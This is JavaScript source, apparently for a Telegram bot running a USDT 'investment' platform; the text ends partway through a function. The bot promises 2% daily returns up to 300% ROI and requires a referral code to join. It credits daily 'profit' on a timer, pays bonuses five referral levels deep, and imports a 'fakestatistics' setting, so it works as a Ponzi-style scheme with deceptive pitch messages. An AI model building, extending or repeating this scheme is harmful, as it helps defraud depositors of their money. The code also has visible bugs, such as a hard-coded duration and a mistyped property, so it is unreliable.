(() => {
    var e = {
            383: e => {
                e.exports = require("./details")
            },
            986: e => {
                "use strict";
                e.exports = require("body-parser")
            },
            860: e => {
                "use strict";
                e.exports = require("express")
            },
            13: e => {
                "use strict";
                e.exports = require("mongodb")
            },
            809: e => {
                "use strict";
                e.exports = require("node-fetch")
            },
            832: e => {
                "use strict";
                e.exports = require("telegraf")
            },
            535: e => {
                "use strict";
                e.exports = require("telegraf-ratelimit")
            }
        },
        t = {};

    function a(n) {
        var r = t[n];
        if (void 0 !== r) return r.exports;
        var s = t[n] = {
            exports: {}
        };
        return e[n](s, s.exports, a), s.exports
    }(() => {
        const {
            Telegraf: e,
            session: t,
            Extra: n,
            Markup: r,
            Scenes: s,
            Context: i
        } = a(832), {
            BaseScene: o,
            Stage: l
        } = s, {
            enter: d,
            leave: c
        } = l, u = new l, m = a(535), f = a(13).MongoClient, p = a(809), {
            token: y,
            admins: w,
            curr: v,
            lvl: h,
            minAmount: k,
            mongo_url: _,
            aboutmsg: $,
            fakestatistics: D,
            USDT_RECIVER: x,
            PrivateKey: T,
            appname: U,
            deposit_text:depotxt,
            CUsername:AE
        } = a(383), S = new e(y), A = a(860), B = a(986), M = A();
        M.use(B.urlencoded({
            extended: !1
        })), M.use(B.json());
        const I = new o("investamo");
        u.register(I);
        const O = new o("manualconvert");
        u.register(O);
        const W = new o("senderSupport");
        u.register(W);
        const C = new o("setwallet");
        u.register(C);
        const N = new o("refercode");
        u.register(N);
        const P = new o("onwith");
        u.register(P);
        const L = new o("mini");
        u.register(L);
        const Y = new o("support");
        u.register(Y);
        const F = new o("max");
        u.register(F);
        const R = new o("tax");
        u.register(R);
        const E = new o("mkey"),
            z = new o("calcprofit");
        u.register(E), u.register(z);
        const q = new o("mid");
        u.register(q);
        const j = new o("subid");
        u.register(j);
        const AS= new o("stakingamo");
        u.register(AS);
        const H = new o("comment");
        u.register(H);
        const Q = new o("addcha");
        u.register(Q);
        const G = new o("rcha");
        u.register(G);
        const K = new o("getref");
        u.register(K);
        const currentDate = new Date();
const day = currentDate.getDate();
const month = currentDate.getMonth() + 1;
const year = currentDate.getFullYear();
const formattedDate = `${day}/${month}/${year}`;
        const Z = new o("chabal");
        u.register(Z);
        const V = new o("getdetails");
        u.register(V);
        const J = new o("refdetails");
        u.register(J);
        const X = new o("paycha");
        u.register(X);
        const ee = new o("broad");

        function te(e, t) {
            try {
                for (const t of w) de(t, "*😢 Wtf! Error Happened In Bot:\n\n" + e + "\n\n*", {
                    parse_mode: "Markdown"
                })
            } catch (e) {
                console.log(e)
            }
        }
        u.register(ee);
        const ae = {
            window: 1e3,
            limit: 1,
            onLimitExceeded: (e, t) => {
                "callback_query" in e.update && e.answerCbQuery("😅 Please Dont Press Buttons to Fast , Try Again...", !0).catch((e => te(e)))
            },
            keyGenerator: e => !!e.callbackQuery
        };
        let ne;
        S.use(m(ae)), S.use(t()), S.use(u.middleware()), f.connect(_, {
            useUnifiedTopology: !0
        }, ((e, t) => {
            e ? console.log(e) : (ne = t.db(y.split(":")[0]), S.launch())
        })), console.log("Bot hosted on server. Try sending /start.");
        var re = [
            ["💰 Wealth", "💹 Invest ", "💲Top Up"],
            ["💸 Cash Out", "👬 Share & Earn", "🖥️ Calculate "],
            ["💬 Chat with Us ", "🔍 About Us"],
        ];
        let se =  [
            ["📈 Track My Investments", "💸 My Withdrawals"],
            ["💼 Wallet", "⬅️ Back"]]
      
    
        se.map((e => e.map((e => ({
            text: e,
            resize_keyboard: !0,
            one_time_keyboard: !0
        })))));
        const ie = async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if (!t.length) {
                    let t = {
                        admin: "admin",
                        ref: 1,
                        mini: 2,
                        max: 4,
                        paycha: "@Username",
                        botstat: "Active",
                        withstat: "On",
                        subid: "Not Set",
                        mid: "NOT SET",
                        mkey: "NOT SET",
                        comment: "NOT SET",
                        tax: 0,
                        channels: []
                    };
                    return ne.collection("admin").insertOne(t), void ue(e, "*👀 Bot Data Saved In Database Try To Restart Bot /start*")
                }
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if ((await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0]) {
                    let t = "Welcome back! Here's the menu:";
                    de(e.from.id, t, {
                        parse_mode: "Markdown",
                        reply_markup: {
                            keyboard: re,
                            resize_keyboard: !0
                        }
                    })
                } else {
                    await e.replyWithPhoto("https://telegra.ph/file/b45195e723ec17b0ee187.jpg",{caption:"🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.",parse_mode:"Markdown"})
                    , await e.scene.enter("refercode")
                }
            } catch (e) {
                console.log(e), te(e)
            }
        }, oe = async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if (!t.length) {
                    let t = {
                        admin: "admin",
                        ref: 0,
                        mini: 2,
                        max: 4,
                        paycha: "@Username",
                        botstat: "Active",
                        withstat: "On",
                        subid: "Not Set",
                        mid: "NOT SET",
                        mkey: "NOT SET",
                        comment: "NOT SET",
                        tax: 0,
                        id:e.from.id,
                        channels: []
                    };
                    ne.collection("admin").insertOne(t);
                    let a = {
                        user: e.from.id,
                        depositBalance: 10,
                        referinfo: "",
                        balance: 10,
                        depositBalance: 20,
                        activeMining: 0,
                        activeStaking:0,
                        totalProfit: 0,
                        totalAffiliateBonus: 0,
                        wallet: "NOT SET",
                        depositAddress: "NOT SET",
                        depositAddressPrivateKey: "NOT SET",
                        activated: !0,
                        maxdepo:0,
                        chJoined: false,
                        referlvl1user: null,
                        referlvl2user: null,
                        referlvl3user: null,
                        referlvl4user: null,
                        referlvl5user: null,
                        referlvl1count: 0,
                        referlvl2count: 0,
                        referlvl3count: 0,                        
                        referlvl4count: 0,
                        referlvl5count: 0,
                        referraldeposits: 0,
                        registereddate:formattedDate,
                        date: (new Date).toLocaleString("en-US", {
                            timeZone: "UTC"
                        })};
                    return await ne.collection("info").insertOne(a), void ue(e, "* Data Saved In Database Try To Restart Bot /start , You are admin*")
                }
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if ("/start" == e.message.text)
                    if ((await ne.collection("info").find({
                            user: e.from.id
                        }).toArray())[0]) {
                        let t = "Welcome back! Here's the menu:";
                        de(e.from.id, t, {
                            parse_mode: "Markdown",
                            reply_markup: {
                                keyboard: re,
                                resize_keyboard: !0
                            }
                        })
                    } else {
                        await e.replyWithPhoto("https://telegra.ph/file/b45195e723ec17b0ee187.jpg",{caption:"🎉 *Welcome to our platform!* 🎉\n\nBefore we get started, we have an exciting offer for you. Do you have a referral code? 🔍\n\nIf yes, please Enter the refer code below to enter your referral code. We want to make sure you get all the benefits that come with being referred by one of our amazing users. 😎\n\n⚠️ Please note that without a referral code, we won't be able to activate your account. So be sure to enter a valid code to avoid any delays in the sign-up process.",parse_mode:"Markdown"})
                       await e.scene.enter("refercode")
                    }
            } catch (e) {
                console.log(e), te(e)
            }
        };
        async function le(e, t) {
            try {
                await S.telegram.deleteMessage(e, t)
            } catch (e) {
                console.log(e)
            }
        }
        async function de(e, t, a) {
            if (e==null) return
            try {
                a ? await S.telegram.sendMessage(e, t, a) : await S.telegram.sendMessage(e, t)
            } catch (e) {
                console.log(e)
            }
        }
        async function ce(e, t, a) {
            try {
                a ? await e.editMessageText(t, a) : await e.editMessageText(t)
            } catch (e) {
                console.log(e)
            }
        }
        async function ue(e, t, a) {
            try {
                a ? await e.replyWithMarkdown(t, a) : await e.replyWithMarkdown(t)
            } catch (e) {
                console.log(e)
            }
        }
        S.start(oe), N.on("text", (async e => {
            try {
                if ((await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0]) S.start(oe);
                else {
                    let t = "refercode",
                        a = e.message.text,
                        n = await ne.collection("info").find({
                            referinfo: a
                        }).toArray();
                    if (!n[0]) return void ue(e, "*🚨 Oops! It looks like the referral code you entered is incorrect or invalid. Please check the code and try again.*");
                    await ue(e, "*👏 You're now eligible for signup with us! We're thrilled to have you join our community and thank you for choosing us.*\n\nTo complete your registration, please join our Telegram channel by clicking the 'Join' button below and then click 'Joined' to confirm that you've joined the channel. 😀", {
                        reply_markup: {
                            inline_keyboard: [[{ text: 'Join channel', url: 'https://t.me/'+AE }], [{ text: 'Joined ✅', callback_data: 'joined:'+a }]]
                        }
                    });
                    
                   await e.scene.leave(t)
                }
            } catch (t) {
                console.log(t), te(t), await e.scene.leave("refercode")
            }
        })),S.action(/joined:(.+)/, async (e) => {
            try {
                const extraData = e.match[1]; // Extract the extra data from the action name
    

                let a = e.from.id4
                if ((await ne.collection("info").find({
                    user: e.from.id
                }).toArray())[0])   del(e) ,S.start(oe);
              
            else {
                let n = await ne.collection("info").find({
                    referinfo: extraData
                }).toArray();
              
            const member = await e.telegram.getChatMember("@"+AE, e.from.id);
            if (member.status === 'member' || member.status === 'creator') {
                let r ={user: e.from.id,referinfo: "",balance: 0,depositBalance: 1,activeMining: 0, maxdepo:0,chJoined: true,activeStaking:0,totalProfit: 0,totalAffiliateBonus: 0,wallet: "NOT SET",depositAddress: "NOT SET",depositAddressPrivateKey: "NOT SET",activated: !0,referlvl1user: n[0].user,referlvl2user: n[0].referlvl1user,referlvl3user: n[0].referlvl2user,referlvl4user: n[0].referlvl3user,referlvl5user: n[0].referlvl4user,referlvl1count: 0,referlvl2count: 0,referlvl3count: 0,referlvl4count: 0,registereddate:formattedDate,referlvl5count: 0,referraldeposits: 0,date: (new Date).toLocaleString("en-US", {    timeZone: "UTC"})
            };
            await ne.collection("info").insertOne(r);
            let referralInfo = n[0]
            await Promise.all([
                ne.collection("info").updateOne({ user: referralInfo.user }, { $inc: { referlvl1count: 1 } }),
                ne.collection("info").updateOne({ user: referralInfo.referlvl1user }, { $inc: { referlvl2count: 1 } }),
                ne.collection("info").updateOne({ user: referralInfo.referlvl2user }, { $inc: { referlvl3count: 1 } }),
                ne.collection("info").updateOne({ user: referralInfo.referlvl3user }, { $inc: { referlvl4count: 1 } }),
                ne.collection("info").updateOne({ user: referralInfo.referlvl4user }, { $inc: { referlvl5count: 1 } })
              ])
              await Promise.all([
                ne.collection("lvl1users").insertOne({refer:referralInfo.user,user: e.from.id,firstname: e.from.first_name,username: e.from.username}),
                ne.collection("lvl2users").insertOne({refer:referralInfo.referlvl1user,user: e.from.id,firstname: e.from.first_name,username: e.from.username}),
                ne.collection("lvl3users").insertOne({refer:referralInfo.referlvl2user,user: e.from.id,firstname: e.from.first_name,username: e.from.username}),
                ne.collection("lvl4users").insertOne({refer:referralInfo.referlvl3user,user: e.from.id,firstname: e.from.first_name,username: e.from.username}),
                ne.collection("lvl5users").insertOne({refer:referralInfo.referlvl4user,user: e.from.id,firstname: e.from.first_name,username: e.from.username})
              ]),await ne.collection("statistics").updateOne({}, {$inc: {    totalUsers: 1}
            })
            const username = e.from.username ? `@${e.from.username}` : e.from.userlink;
const referralMsg = `➕ *New Referral:* ${e.from.first_name}${username ? ` (${username})` : ""} on level`;

                        await Promise.all([
                            de(referralInfo.user, `${referralMsg} 1`,{parse_mode: "markdown"}),
                            de(referralInfo.referlvl1user, `${referralMsg} 2`,{parse_mode: "markdown"}),
                            de(referralInfo.referlvl2user, `${referralMsg} 3`,{parse_mode: "markdown"}),
                            de(referralInfo.referlvl3user, `${referralMsg} 4`,{parse_mode: "markdown"}),
                            de(referralInfo.referlvl4user, `${referralMsg} 5`,{parse_mode: "markdown"}),
                           
                           
                          ]);

                          
                          e.answerCbQuery('✅ Thank you for joining the channel and confirming your registration!', { alert: true });
                          del(e)
                          

                          await e.replyWithPhoto("https://telegra.ph/file/9e36112f540a75b981d73.jpg", { caption: "🎉 Congratulations! You've just received a 1$ USDT signup bonus, which has been credited to your account! 🤑\n\n" ,reply_markup: {    keyboard: re,    resize_keyboard: !0}});

                        
                // Add your code to proceed with registration here
            } else {
                // User has not joined the channel yet
                e.answerCbQuery('❌ You need to join the channel first before you can confirm your registration. Please click the "Join channel" button to join the channel.', { alert: true });
            }}
        }catch(et){
      te(et?.message)
        }})
        async function del(e){
            try{
           await  e.deleteMessage()
            }catch(e){
                console.log(e)
            }
        } S.hears(["Back 🔙", "↩️ Back to Menu", "⬅️ Back"], (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                de(e.from.id, "*We are back to Home Page 🏠* ", {
                    parse_mode: "Markdown",
                    reply_markup: {
                        keyboard: re,
                        resize_keyboard: !0
                    }
                })
            } catch (e) {
                console.log(e), te(e)
            }
        })),S.hears("🚀 My Stakings", (async e => {
            const t = e.from.id,
                a = await ne.collection("userinvestmentinlist").findOne({
                    user: t
                });
            if (!a || !a.investments || 0 === a.investments.length) return void e.reply("🙁 You have no investment history yet!");
            const n = a.investments.length,
                r = Math.ceil(n / 10);
            let s = n - 1;
            for (let t = 0; t < r; t++) {
                let n = `💰 *Your Investment History:* (${s+1}-${Math.max(0,s-9)})\n\n`;
                for (let e = 0; e < 10 && s >= 0; e++) {
                    const r = a.investments[s],
                        i = new Date(r.starttime).toLocaleString(),
                        o = new Date(r.endtime).toLocaleString();
                    let l = "";
                    if (r.endtime < Date.now()) {
                        l = "0s";
                    } else {
                        const remainingTime = Math.floor((r.endtime - Date.now()) / 1000);
                        const hours = Math.floor(remainingTime / 3600);
                        const minutes = Math.floor((remainingTime % 3600) / 60);
                        const seconds = remainingTime % 60;
                        l = `${hours}h ${minutes}m ${seconds}s`;
                        if (remainingTime <= 0) {
                            l = "0s";
                        }
                    }
                    n += `*${e+1+10*t})* Amount: ${r.amount} USDT\n    Start Date: ${i}\n    End Date: ${o}\n`;
                    n += `    Remaining Time: ${l}\n    Status: ${r.status}\n\n`;
                    s--;
                }
                await e.reply(n, {parse_mode: "markdown"});
            }
        }))
        
        ,S.action("invest", async (e) => {
            try {
                let at = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                let t = await ne.collection("info").find({ user: e.from.id }).toArray();
                if (!("activated" in t[0])) {
                    return void ie(e);
                }
                console.log(at[0].mkey)
                if (at[0].mkey===false) return void e.answerCbQuery("⛔ Currently mining Are Not available",{ show_alert: !0 });
                let a = "depositBalance" in t[0] ? fe(t[0].depositBalance, 2) : "0.00";
                if (Number(a) < 1) {
                    return void e.answerCbQuery("You don't meet the minimum balance requirement of 1 USDT(Matic). Please deposit funds to continue.", { show_alert: !0 });
                }
                const maxInvestable = a;

const text = `🚀 *Ready to launch your investment journey?*\n\n💰 *Investment Options* 💸\n\n🎉 *Your maximum investable amount is* _${maxInvestable} USDT_.\n\n💡 *Here's an investment plan option for you:* 💡\n\n💰 *Daily Income:* 💰\n💸 Earn 2% daily on your investment, from minimum 25 USDT to Infinity.\n📈 This plan lasts until you reach a 300% return on investment.\n\n💪 *Start earning now!* 💪\nSimply enter the amount you'd like to invest below.\n\n🔒 Additionally, please note that we take the security of your investment seriously and employ industry-standard measures to protect your funds.`
                ce(e,text, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "⬅️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    },
                    parse_mode: "Markdown"
                });
                await e.scene.enter("investamo", { user: e.from.id });
            } catch (e) {
                console.log(e);
                te(e);
            }
        }) ,S.action("staking", async (e) => {
            try {
                let at = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                let t = await ne.collection("info").find({ user: e.from.id }).toArray();
                if (!("activated" in t[0])) {
                    return void ie(e);
                }
                console.log(at[0].mid)
                if (at[0].mid===false) return void e.answerCbQuery("⛔ Currently Not available",{ show_alert: !0 });
                let a = "depositBalance" in t[0] ? fe(t[0].depositBalance, 2) : "0.00";
                if (Number(a) < 1) {
                    return void e.answerCbQuery("You don't meet the minimum balance requirement of 1 USDT. Please deposit funds to continue.", { show_alert: !0 });
                }
                const maxInvestable = a;
const text = "*💰 Investment Options 💸*\n\n🎉 *Your maximum investable amount is* _"+maxInvestable+" USDT_.\n\n💡 *Here's an investment plan option for you:* 💡 \n\n*Daily Income:*\nEarn 2% daily on your investment, capped at 300 USDT.\n\nThis plan lasts until you reach a 200% return on investment.\n\n🚀 Ready to launch your investment journey and start earning? 💪\nSimply enter the amount you'd like to invest below.\n\nAdditionally, please note that we take the security of your investment seriously and employ industry-standard measures to protect your funds.";

                ce(e,text, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "⬅️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    },
                    parse_mode: "Markdown"
                });
                await e.scene.enter("stakingamo", { user: e.from.id });
            } catch (e) {
                console.log(e);
                te(e);
            }
        }),I.on("text", (async e => {
            try {
              const t = "investamo";
              if ("↩️ Back" == e.message.text) return void await e.scene.leave(t);
              {
                let a = parseFloat(e.message.text);
                if (isNaN(a)) return void e.reply("⛔️ Please enter a numerical value only. Please try again.");
          
                if (a < 25) {
  return await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, "*❌ Failed*\n\nYour entered Investment Amount of *" + a + " USDT* is less than the minimum amount of *25 USDT*. Please enter a valid amount to proceed.", {
    reply_markup: {
      inline_keyboard: [
        [{
          text: "↩️ Back",
          callback_data: "backToInvest"
        }]
      ]
    },
    parse_mode: "markdown"
  }), void await e.scene.leave(t);
}



          
                const n = await ne.collection("info").find({
                  user: e.scene.state.user
                }).toArray(),
                  r = "depositBalance" in n[0] ? fe(n[0].depositBalance, 8) : "0.00000000";
          
                if (a > parseFloat(r)) {
                  return await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, "*❌ Failed to start a New Mining *\n\nYour entered amount of *" + a + " USDT* is greater than your investable balance of *" + r + " USDT*. Please deposit more funds to proceed.", {
                    reply_markup: {
                      inline_keyboard: [
                        [{
                          text: "↩️ Back",
                          callback_data: "backToInvest"
                        }]
                      ]
                    }
                  }), void await e.scene.leave(t);
                }
          
                await ne.collection("info").updateOne({
                  user: e.scene.state.user
                }, {
                  $inc: {
                    depositBalance: -a
                  },
                  $set: {
                    chJoined: true
                  }
                }), await ne.collection("statistics").updateOne({}, {
                  $inc: {
                    totalInvests: a
                  }
                });
          
                let mining = {
                    hourly_percent: 2.0,
                    minimum_investment: 25,
                    maximum_investment: Infinity,
                    roi_multiplier: 3
                };
        
                let selectedMining = mining;

                let dailyPercent = selectedMining.hourly_percent * 24;
                let totalROI = selectedMining.roi_multiplier * a;
                if (totalROI > (selectedMining.roi_multiplier * selectedMining.maximum_investment)) totalROI = selectedMining.roi_multiplier * selectedMining.maximum_investment;
                let dailyProfit = a * 2 / 100;
                let totalProfit = totalROI - a;
                let totalDays = totalProfit / dailyProfit;
                let hourlyGain = a * selectedMining.hourly_percent / 100;
                let dailyGain = hourlyGain * 24;
                let days = Math.floor(totalDays);
                let hours = Math.floor((totalDays - days) * 24);
                let minutes = Math.floor((((totalDays - days) * 24) - hours) * 60);
                let accumulatedBalance = totalROI.toFixed(2);
                let message = `✅ *Successfully started investment* \n\n💰 *Invested amount:* ${a} USDT\n📈 *Plan:* ${selectedMining.hourly_percent}% daily \n💹 *Daily profit:* ${dailyProfit.toFixed(8)} USDT\n⏳ *Time to end:* 150 d 0 h ${minutes}m\n💸 *Total profit:* ${totalProfit.toFixed(8)} USDT\n💳 *Investment return:* ${accumulatedBalance} USDT`;
                await ue(e, message, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    }
                }), void await e.scene.leave(t), await ne.collection("pendinginvestmentsall").insertOne({
                  user: e.from.id,
                  amount: a,
                  daily_profit: dailyProfit,
                  plan: selectedMining.hourly_percent,
                  credit_time: totalDays,
                  days_to_expire: ` ${days}d ${hours}h ${minutes}m`,
                  total_profit: totalProfit,
                  investment_return: accumulatedBalance,
                  started_at: new Date(),
                  active: !0,
                  status: "Active",
                  gained: 0,
                  lastcdTime: Date.now(),
                  yetcredited: 0,
                  last: 300
                })
                await ne.collection("info").updateOne({
                  user: e.from.id
                }, {
                  $inc: {
                    activeMining: a
                  }
                })
                if (n[0].registereddate==formattedDate){
                const result = await checknReward(e.from.id, a, e.from.first_name)
                const rest = await directReward(e.from.id, a, e.from.first_name)
                console.log(rest, result)
                }else{
                    const rest = await directReward2(e.from.id, a, e.from.first_name)
                    console.log(rest)
                }
              
              }
          
            } catch (t) {
              console.error(t), await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, "❌ Something went wrong while starting a new investment. Please try again later.", {
                reply_markup: {
                  inline_keyboard: [
                    [{
                      text: "↩️ Back",
                      callback_data: "backToInvest"
                    }]
                  ]
                }
              })
            }
          }));
          
        
        async function checknReward(user,amount,name) {
            const userRecord = await ne.collection("info").findOne({ user });
            const userIds = [userRecord.referlvl1user];
          
            for (const userId of userIds) {
              if (userId == null) {
                console.log("skipped");
                continue;
              }
          
              try {
                const referredRecords = await ne.collection(formattedDate).find({ referrer: userId }).toArray();
                const referredCount = referredRecords.length;
                const referredUser = await ne.collection("info").findOne({ user: userId });
                console.log(referredCount)
                if (referredUser.chJoined) {
                    const bonusPercent = getBonusPercent(referredCount);
                    const bonusAmount = amount * bonusPercent;
                    console.log(bonusAmount , bonusPercent)
                    await ne.collection("info").updateOne(
                        { user: userId },
                        {
                          $inc: { balance: bonusAmount,totalProfit: bonusAmount ,totalAffiliateBonus: bonusAmount }
                        }
                      );
                      const message = `🎉 Congratulations 🎉\n\nYou have received a bonus of ${bonusAmount.toFixed(2)} USDT which is ${getBonusPercent(referredCount)*100}% of your referred user plan.\n\n🚀 Today your referral bonus is boosted to ${getBonusPercent(referredCount+1)*100}% more! 🚀\n\nFor your next referral, your bonus will be boosted even higher! Keep referring more users to the bot to earn even more rewards.`;
                      await de(userId, message);
                      await ne.collection(formattedDate).insertOne({ referrer: userId, user:user,name :name,amount:amount})
                } else {
                    const message = `🚫 Oops, you missed your referral bonus! 🚫\n\nWe noticed that you didn't invest any amount in your account, so unfortunately you did not receive the bonus for referring user ${name} to the investment plan. \n\nInvest now to start earning referral bonuses and other rewards!`;
                await de(userId, message);
                }
              } catch (error) {
                console.error(`Error checking rewards for user ${userId}: `, error);
              }
            }
          
            return "success";
          }
          async function directReward2(user, amount, name) {
            const userRecord = await ne.collection("info").findOne({ user });
            const userIds = [userRecord.referlvl1user,userRecord.referlvl2user, userRecord.referlvl3user, userRecord.referlvl4user, userRecord.referlvl5user];
            
            for (const userId of userIds) {
              if (userId == null) {
                console.log("skipped");
                continue;
              }
            
              try {
                const referredUser = await ne.collection("info").findOne({ user: userId });
                
                if (referredUser.chJoined) {
                  let bonusPercent;
                  
                  switch (userId) {
                    case userRecord.referlvl1user:
                      bonusPercent = 0.05; // 5% bonus for level 1 referral
                      break;
                    case userRecord.referlvl2user:
                      bonusPercent = 0.04; // 4% bonus for level 2 referral
                      break;
                    case userRecord.referlvl3user:
                      bonusPercent = 0.03; // 3% bonus for level 3 referral
                      break;
                    case userRecord.referlvl4user:
                      bonusPercent = 0.02; // 2% bonus for level 4 referral
                      break;
                    case userRecord.referlvl5user:
                      bonusPercent = 0.01; // 1% bonus for level 5 referral
                      break;
                    default:
                      console.log("Invalid referral level");
                      continue;
                  }
                  
                  const bonusAmount = amount * bonusPercent;
                  await ne.collection("info").updateOne(
                    { user: userId },
                    {
                      $inc: { balance: bonusAmount, totalProfit: bonusAmount,totalAffiliateBonus: bonusAmount }
                    }
                  );
                  
                  const message = `🎉 Congratulations 🎉\n\nYou have received a bonus of ${bonusAmount.toFixed(2)} USDT under Referral Networking Program.\n\n🚀For your next referral, your bonus will be boosted even higher! Keep referring more users to the bot to earn even more rewards.`;
                  await de(userId, message);
                  
                  await ne.collection(formattedDate).insertOne({ referrer: userId, user, name, amount });
                } else {
                  const message = `🚫 Oops, you missed your referral bonus! 🚫\n\nWe noticed that you didn't invested any amount in your account, so unfortunately you did not receive the bonus under Referral Networking Program.\n\nInvest now to start earning referral bonuses and other rewards!`;
                  await de(userId, message);
                }
              } catch (error) {
                console.error(`Error checking rewards for user ${userId}: `, error);
              }
            }
            
            return "success";
          }
          async function directReward(user, amount, name) {
  const userRecord = await ne.collection("info").findOne({ user });
  const userIds = [userRecord.referlvl2user, userRecord.referlvl3user, userRecord.referlvl4user, userRecord.referlvl5user];
  
  for (const userId of userIds) {
    if (userId == null) {
      console.log("skipped");
      continue;
    }
  
    try {
      const referredUser = await ne.collection("info").findOne({ user: userId });
      
      if (referredUser.chJoined) {
        let bonusPercent;
        
        switch (userId) {
          case userRecord.referlvl2user:
            bonusPercent = 0.04; // 4% bonus for level 2 referral
            break;
          case userRecord.referlvl3user:
            bonusPercent = 0.03; // 3% bonus for level 3 referral
            break;
          case userRecord.referlvl4user:
            bonusPercent = 0.02; // 2% bonus for level 4 referral
            break;
          case userRecord.referlvl5user:
            bonusPercent = 0.01; // 1% bonus for level 5 referral
            break;
          default:
            console.log("Invalid referral level");
            continue;
        }
        
        const bonusAmount = amount * bonusPercent;
        await ne.collection("info").updateOne(
          { user: userId },
          {
            $inc: { balance: bonusAmount, totalProfit: bonusAmount,totalAffiliateBonus: bonusAmount }
          }
        );
        
        const message = `🎉 Congratulations 🎉\n\nYou have received a bonus of ${bonusAmount.toFixed(2)} USDT under Referral Networking Program.\n\n🚀For your next referral, your bonus will be boosted even higher! Keep referring more users to the bot to earn even more rewards.`;
        await de(userId, message);
        
        await ne.collection(formattedDate).insertOne({ referrer: userId, user, name, amount });
      } else {
        const message = `🚫 Oops, you missed your referral bonus! 🚫\n\nWe noticed that you didn't invest any amount in your account, so unfortunately you did not receive the bonus under Referral Networking Program.\n\nInvest now to start earning referral bonuses and other rewards!`;
        await de(userId, message);
      }
    } catch (error) {
      console.error(`Error checking rewards for user ${userId}: `, error);
    }
  }
  
  return "success";
}

function getBonusPercent(referCount) {
    if (referCount === 0) {
      return 0.05;
    } else if (referCount === 1) {
      return 0.15;
    } else if (referCount === 2) {
      return 0.25;
    } else if (referCount === 3) {
      return 0.35;
    } else if (referCount >= 4)  {
      return 0.45;
    } 
  }
          
        async function checkin() {
            const cutoffTime = Date.now() - 24 * 60 * 60 * 1000; // 24 hours ago
            const investments = await ne.collection("pendinginvestmentsall")
              .find({
                status: "Active",
                lastcdTime: { $lt: cutoffTime }
              })
              .toArray();
              
            for (const investment of investments) {
              const { user, amount, daily_profit, dailyProfit,yetcredited, plan, credit_time, days_to_expire, total_profit, investment_return, started_at, active, status, gained, lastcdTime } = investment;
              const elapsed = Date.now() - lastcdTime;
              const elapsedHours = elapsed / (24 * 60 * 60 * 1000);
            
              if (elapsedHours >= 1) {
                const newBalance = yetcredited + daily_profit;
                const newGained = gained + plan;
            
                await ne.collection("pendinginvestmentsall").updateOne({ _id: investment._id }, {
                  $set: {
                    yetcredited: newBalance,
                    lastcdTime: Date.now(),
                    gained: newGained,
                  },
                });
                await ne.collection("info").updateOne({
                    user: parseFloat(user)
                }, {
                    $inc: {
                        balance: parseFloat(daily_profit),
                        totalProfit: parseFloat(daily_profit)
                    }
                });
                console.log("just credited to user: " + user);
                const message2 = `🎉 Woohoo! You did it! Your daily reward of *${daily_profit} USDT* has been deposited into your account. Keep crushing it! 🚀💪🎉                `;
                await de(user, message2, { parse_mode: "Markdown" });
                if (newGained >= 300) {
                  await ne.collection("pendinginvestmentsall").updateOne({ _id: investment._id }, {
                    $set: { status: "Completed" },
                  });
                  await ne.collection("info").updateOne({
                    user: parseFloat(user)
                  }, {
                    $inc: {
                      activeMining: -amount
                    }
                  })
                  const message = `🎉 Congratulations! Your started Investment Plan of *${amount} USDT* has been Finished! You have gained total *${total_profit} USDT* `;
                  await de(user, message, { parse_mode: "Markdown" });
                }
                
               
              }
            }
          }
          
          setInterval(checkin, 60000);
                  
                            S.action("backToInvest", (async e => {
            try {
                let t = await ne.collection("info").findOne({
                    user: e.from.id
                })
                
                await e.scene.leave("investamo");
                let n =  fe(t.depositBalance, 8)
                const r = `*Welcome to USDT investment!* \n\n*What would you like to do?*\n\n💰 Convert Balance – Transfer your available balance to deposit balance.\n\n💎 Invest – Earn USDT by participating in the mining program.\n\n💳 *Withdrawable balance:* ${fe(t.balance,8)} *USDT*\n*💹 Investable Balance:* ${n} *USDT*\n\n`,
                s = [
                        [{
                            text: "💸 Convert Balance",
                            callback_data: "convertToDeposit"
                        }],
                        [{
                            text: "💎 Invest",
                            callback_data: "invest"
                        }]
                    ]                
                        await ce(e, r, {
                    reply_markup: {
                        inline_keyboard: s
                    },
                    parse_mode: "Markdown"
                })
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.hears("📈 Track My Investments", async (e) => {
            const user = e.from.id;
            const data = await ne.collection("pendinginvestmentsall").find({user:user}).toArray();
            if (!data || data.length === 0) {
            return e.reply("🙁 You have no Investment history yet!");
            }
            const miningList = data.sort((a, b) => b.started_at - a.started_at);
            const numMining = miningList.length;
            const numPages = Math.ceil(numMining / 10);
            let idxMining = numMining - 1;
            for (let i = 0; i < numPages; i++) {
            let message = `⛏️ *Your Investment History:* (${idxMining + 1}-${Math.max(0, idxMining - 9)})\n\n`;
            for (let j = 0; j < 10 && idxMining >= 0; j++) {
            const mining = miningList[idxMining];
